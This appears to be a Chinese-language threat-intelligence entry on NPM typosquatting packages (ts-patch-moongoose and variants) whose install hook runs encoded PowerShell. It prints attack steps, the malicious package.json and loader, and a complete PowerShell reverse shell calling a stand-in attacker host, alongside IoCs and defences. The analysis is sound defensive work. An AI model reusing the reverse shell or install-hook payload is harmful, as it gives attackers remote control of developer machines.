---
id: cloud-cicd-npm-typosquat-install-powershell-reverse-shell
title: NPM typo-squatting 仿冒包 install 脚本执行 base64 PowerShell 反向 shell
type: scenario
domain: cloud
path: cloud/ci-cd
technique: npm-typosquat-install-reverse-shell
aliases:
- NPM 投毒
- typo-squatting 恶意包
- npm install 反向 shell
- ts-patch-moongoose
- 恶意 npm 包反弹 shell
tags:
- npm
- supply-chain
- typosquatting
- install-script
- powershell
- reverse-shell
- windows
- initial-access
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: ts-patch-mongose [1.0.0,1.0.0]||[2.0.0,2.0.0]||[3.0.0,3.0.0]||[3.0.1,3.0.1]||[4.0.0,4.0.0]; ts-patch-mongoos [1.0.0,1.0.0]||[2.0.0,2.0.0]; ts-patch-moongoose [1.0.0,1.0.0]||[2.0.0,2.0.0]
verification:
  verified_by: verifier-V515
  verified_at: '2026-11-11T11:32:28+08:00'
  notes: 已对照原文及全部6张图核对：安装钩子 scripts.install=node mongoose.js、child_process.exec(powershell -ep bypass -e base64)、TCPClient 反弹 84.77.69.69:4443、IoC MD5 均与截图/正文一致。发现卡片 affected_versions 原与正文 db.json 相反（表图 02 的包名与 MD5 文件名互换），已按正文 db.json 与图 06 IoC（mongose-4.0.0、moongoose-2.0.0 存在）修正为 mongose 5 版本、mongoos/moongoose 各 2 版本；共 9 个恶意版本与概述一致。PoC 未执行、C2 未访问。
---

## 一句话结论

攻击者用 typo-squatting 在 NPM 发布与合法包名相近的仿冒包（如把 `ts-patch-mongoose` 拆成 `ts-patch-moongoose`/`ts-patch-mongoos`/`ts-patch-mongose` 并各发多版本），在 `package.json` 的 `install` 生命周期里让 `npm install` 自动执行 `child_process.exec` 运行 base64 编码的 PowerShell；解码后通过 `System.Net.Sockets.TCPClient` 把 Windows 开发者主机的 shell 反弹到攻击者 IP:端口，安装即被远程控制。

## 原理

- **安装即执行**：NPM 包可在 `package.json` 的 `scripts` 中定义 `preinstall`/`install`/`postinstall` 生命周期脚本，npm 在安装该包时自动执行，不需要业务代码 `require` 它。本文恶意包的 `scripts.install = "node mongoose.js"`，只要开发者误装，脚本立即运行。
- **typo-squatting 选名**：仿冒热门/合法包名——多一个字母（`moongoose`）、少一个字母（`mongoos`）、换一个字母（`mongose`）等；同时发布多个版本与相近名字，扩大被手误安装或搜索命中的概率。比劫持维护者账户门槛更低，不需要发布权限。
- **载荷执行链**：`mongoose.js` 里 `require('child_process').exec("powershell -ep bypass -e <base64>")`。`-ep bypass` 绕过 PowerShell 执行策略，`-e` 执行 UTF-16LE base64 编码的命令，同时规避命令行明文检测。
- **解码后的反弹 shell**：`New-Object System.Net.Sockets.TCPClient('attacker-ip',4443)` 建立 TCP 连接，取 `GetStream()`，循环读取攻击者发来的命令并 `iex` 执行，把执行结果与提示符 `PS <path>>` 写回连接；`-WindowStyle Hidden` 隐藏窗口。经典 PowerShell 反向 shell 模板，攻击者用 `nc -lv 4443` 即可获得交互式 shell。
- **为什么危害大**：开发者主机通常持有源码、包管理器令牌、云凭据、SSH 密钥；一次误装即从供应链获得初始访问，且恶意代码随包分发、镜像源同步传播。

## 触发条件

- 开发者在 Windows 上误装仿冒包（或 CI 依赖解析到该包），npm 未使用 `--ignore-scripts`。
- 主机可出站访问攻击者 C2 IP/端口（本文为 84.77.69.69:4443）。
- Windows 默认 PowerShell 可用，用户权限足以建立出站连接。

## 利用步骤

1. 选热门/合法 NPM 包，注册多个 typo 变体名称，各发布多个版本（本文 3 个包名、9 个版本）。
2. 在恶意包 `package.json` 写 `"scripts": { "install": "node mongoose.js" }`，并准备 `mongoose.js`。
3. `mongoose.js` 用 `child_process.exec` 执行 `powershell -ep bypass -e <base64 编码的反向 shell 命令>`。
4. 攻击者服务器监听目标端口；开发者 `npm install <仿冒包>` 后，Windows 主机自动回连。
5. 在监听的会话中执行 whoami、ipconfig、目录浏览等命令，进一步窃取凭据/横向。

## PoC

恶意包 `package.json`（片段）：

```json
{
  "name": "ts-patch-moongoose",
  "version": "2.0.0",
  "main": "mongoose.js",
  "scripts": { "install": "node mongoose.js" }
}
```

`mongoose.js`（片段）：

```javascript
const { exec } = require('child_process');
const command = 'powershell -ep bypass -e <BASE64_UTF16LE_PAYLOAD>';
exec(command, (error, stdout, stderr) => { /* ... */ });
```

解码后的 PowerShell 反向 shell（结构示意，不连接真实地址）：

```powershell
Start-Process $PSHOME\powershell.exe -ArgumentList {
  $c = New-Object System.Net.Sockets.TCPClient('attacker.example', 4443);
  $s = $c.GetStream();
  [byte[]]$b = 0..65535 | %{0};
  while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $cmd = (New-Object System.Text.ASCIIEncoding).GetString($b, 0, $i);
    $out = (iex $cmd 2>&1 | Out-String);
    $out = $out + 'PS ' + (pwd).Path + '> ';
    $sb = ([text.encoding]::ASCII).GetBytes($out);
    $s.Write($sb, 0, $sb.Length); $s.Flush()
  }
  $c.Close()
} -WindowStyle Hidden
```

```powershell
# 生成 -e 载荷
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

排查/处置命令：

```bash
npm list ts-patch-moongoose
npm list ts-patch-moongoose -g
npm remove ts-patch-moongoose
npm remove ts-patch-moongoose -g
```

## 变体与关联

- 变体：用 `postinstall`/`preinstall` 代替 `install`；或恶意代码放在主入口文件，开发者首次 `require` 时执行（不在安装期触发，但可绕过 `--ignore-scripts`）。
- 变体：`-e` 编码命令可换成下载二阶段脚本（`curl`/`Invoke-WebRequest`）再执行，便于替换载荷与多次投递。
- 关联：[[cloud-cicd-npm-postinstall-supply-chain-poisoning]]（postinstall 隐藏依赖 + 跨平台二阶段 RAT，同为安装期代码执行的供应链投毒）、[[cloud-cicd-accesskey-tools-typosquat-sdk-endpoint-hijack]]（typo-squatting 的另一形态）。
- 边界：`npm install --ignore-scripts` 不执行生命周期脚本；依赖白名单/签名校验/registry 代理可阻断误装；主机禁用 PowerShell 或限制出站时载荷失效。

## 检测与防御

- 检测：安装期出现 `node` 子进程拉起 `powershell -ep bypass -e`；出站连接陌生公网 IP 的 4443 等非常见端口；npm 审计日志出现与合法包名相近的拼写。
- 检测：IoC——恶意文件 `mongoose.js`（如 MD5 `c5806cc23952650fb020c5b9484b045c`、`af25a4928e4e269477fa9ce20d8f3cc2`、`1cf73cffdc1242b5762127a645816bbf`）、C2 `84.77.69.69:4443`。
- 修复：卸载恶意包、隔离主机、轮换源码仓库/包管理器/云凭据，审计异常进程与网络。
- 加固：CI 用 `npm ci --ignore-scripts` 或脚本白名单；锁定 lockfile、启用 provenance/签名校验；开发者核对包名与仓库地址；registry 代理与出站访问控制。
